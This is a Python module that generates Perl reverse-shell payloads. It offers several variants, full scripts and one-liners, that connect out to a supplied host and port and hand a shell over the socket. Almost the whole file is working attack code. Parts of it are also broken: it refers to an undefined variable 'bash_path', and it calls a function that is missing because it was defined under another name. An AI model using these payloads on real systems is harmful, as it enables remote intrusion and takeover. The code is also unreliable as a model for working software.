import logging

from enum import Enum
from typing import Optional

logger = logging.getLogger(__name__)

class PerlPayloadType(Enum):
    PERL_EXEC = 0
    PERL_EXEC_CLI = 1
    PERL_SYSTEM = 2
    PERL_SYSTEM_CLI = 3

def generate_reverse_shell(
    lhost: str,
    lport: int,
    shell_path: str = "/bin/bash",
    payload_type: PerlPayloadType = PerlPayloadType.PERL_EXEC,
) -> Optional[str]:

    payload: Optional[str] = None

    match payload_type:
        case PerlPayloadType.PERL_EXEC:
            payload = generate_perl_exec_payload(lhost, lport, bash_path)
        case PerlPayloadType.PERL_EXEC_CLI:
            payload = generate_perl_exec_cli_payload(lhost, lport, bash_path)
        case PerlPayloadType.PERL_SYSTEM:
            payload = generate_perl_system_payload(lhost, lport, bash_path)
        case PerlPayloadType.PERL_SYSTEM_CLI:
            payload = generate_perl_system_cli_payload(lhost, lport, bash_path)
        case _:
            logger.error("unknown perl payload type")
            pass

    return payload

def generate_perl_exec_payload(
    lhost: str,
    lport: int,
    shell_path: str,
    perl_path: str = "/bin/perl",
) -> str:
    return f"""
#!{perl_path}
use Socket;
$ip="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
$c=connect(S,sockaddr_in($p,inet_aton($ip)));
if($c){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("{shell_path} -i");
}};"""

def generate_perl_exec_cli_payload(
    lhost: str,
    lport: int,
    shell_path: str,
    perl_path: str = "/bin/perl",
) -> str:
    return f"""{perl_path} -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell_path} -i");}};'"""

def generate_perl_system_cli_payload(
    lhost: str,
    lport: int,
    shell_path: str, # unused
    perl_path: str = "/bin/perl",
) -> str:
    return f"""{perl_path} -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""

def generate_system_exec_payload(
    lhost: str,
    lport: int,
    shell_path: str, # unused
    perl_path: str = "/bin/perl",
) -> str:
    return f"""
#!{perl_path}
use IO::Socket::INET; 
$p=fork;
exit,if($p);
$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");
STDIN->fdopen($c,r);
$~->fdopen($c,w);
system$_ while<>;"""
